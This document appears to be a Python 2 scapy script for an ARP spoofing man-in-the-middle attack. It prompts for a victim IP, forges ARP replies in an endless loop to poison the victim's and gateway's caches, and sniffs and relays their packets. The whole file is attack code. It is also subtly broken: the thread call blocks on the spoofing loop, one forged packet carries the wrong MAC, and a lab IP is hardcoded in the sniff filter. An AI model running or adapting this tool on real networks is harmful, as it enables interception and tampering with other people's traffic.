#python 2.7.12
#sudo python arp.py
import socket
import fcntl
import struct
import string
from scapy.all import *
import os
import subprocess
import shlex
import thread
import time
def dong():
	while(1):
		send(ARP(op=2, pdst=Victim_IP_addr,psrc=Target_IP_addr, hwdst=Victim_mac_addr,hwsrc=Attacker_Mac_addr))
		send(ARP(op=2, pdst =Target_IP_addr,psrc=Victim_IP_addr, hwdst =Victim_mac_addr, hwsrc=Attacker_Mac_addr))
		time.sleep(3)
def HwAddr(ifname):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
        myMac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
        return myMac 
def Ipaddr(ifname):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
        myIp = socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', ifname[:15]))[20:24])
	return myIp

# get gateway address
gateway= subprocess.check_output(shlex.split('ip r l'))
Target_IP_addr = gateway.split('default via')[-1].split()[0]


Attacker_Mac_addr = HwAddr('enp0s5')
Attacker_IP_addr = Ipaddr('enp0s5')
#Victim_IP_addr = '10.211.55.6'
Victim_IP_addr = raw_input('input VictimIP : ')

print "--------------------------------------------"
print "Attacker MAC Address : "  + Attacker_Mac_addr
print "Attacker IP Address : " + Attacker_IP_addr
print "--------------------------------------------"

print "*****Attacker get Target_mac_addr for Targer_IP_addr*****"
Target_mac_addr=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=Target_IP_addr),timeout=2)
print "--------------------------------------------"
print "Target_mac_addr : "+ Target_mac_addr[0][0][1].src
print "Target_IP_Address : " + Target_IP_addr
print "reply_packet : "
print Target_mac_addr[0][0]
print "--------------------------------------------"

print "*****Attacker get Victim_mac_addr for Victim_IP_addr*****"
Victim_mac_addr = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=Victim_IP_addr),timeout=2)
print "--------------------------------------------"
print "Victim_mac_addr : " +Victim_mac_addr[0][0][1].src
print "Victim IP Address : " + Victim_IP_addr
print "reply_packet : "
print Victim_mac_addr[0][0]
print "--------------------------------------------"

Target_mac_addr = Target_mac_addr[0][0][1].src
Victim_mac_addr= Victim_mac_addr[0][0][1].src
print "------------------------------------------------------"
thread.start_new_thread(dong())

print '*****Arp Spooping*****'

#send(ARP(op=2, pdst=Victim_IP_addr,psrc=Target_IP_addr, hwdst=Victim_mac_addr,hwsrc=Attacker_Mac_addr))
go_to_Victim_packet = sniff(filter="host 10.211.55.1", count=1)
#print go_to_Victim_packet

if  go_to_Victim_packet[0][0][0].dst == Attacker_Mac_addr:
	go_to_Victim_packet[0][0][0].dst = Target_mac_addr
	go_to_Victim_packet[0][0][0].src = Attacker_Mac_addr	
	#print go_to_Victim_packet.show()
	#send(ARP(op=2, pdst=Victim_IP_addr,psrc=Target_IP_addr, hwdst=Victim_mac_addr,hwsrc=Attacker_Mac_addr))
	send(go_to_Victim_packet)
	print "------------------------------------------------------------------"
	#send(ARP(op=2, pdst =Target_IP_addr,psrc=Victim_IP_addr, hwdst =Victim_mac_addr, hwsrc=Attacker_Mac_addr))
	go_to_Target_packet = sniff(filter="host 10.211.55.1" ,count=1)
	print go_to_Target_packet.show()
	if  go_to_Target_packet[0][0][0].dst == Attacker_Mac_addr:
		go_to_Target_packet[0][0][0].dst = Victim_mac_addr
		go_to_Target_packet[0][0][0].src = Attacker_Mac_addr
	print go_to_Target_packet.show()
	send(go_to_Target_packet)
